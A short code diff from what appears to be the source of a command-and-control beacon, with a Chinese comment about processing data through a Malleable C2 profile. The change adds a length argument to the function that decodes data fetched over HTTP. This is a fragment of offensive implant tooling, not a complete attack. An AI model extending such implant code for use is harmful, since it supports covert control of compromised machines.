@@ -322,7 +322,7 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
  * 使用Malleable C2程序处理我们读取的数据
  */
 	// dlog("channel._http_get - Recovering data with Malleable C2 processing \n");
-	read = recover(setting_ptr(SETTING_C2_RECOVER), buffer, read, max);
+	read = recover(setting_ptr(SETTING_C2_RECOVER), (int)setting_length(SETTING_C2_RECOVER), buffer, read, max);
 
 	return read;
 }
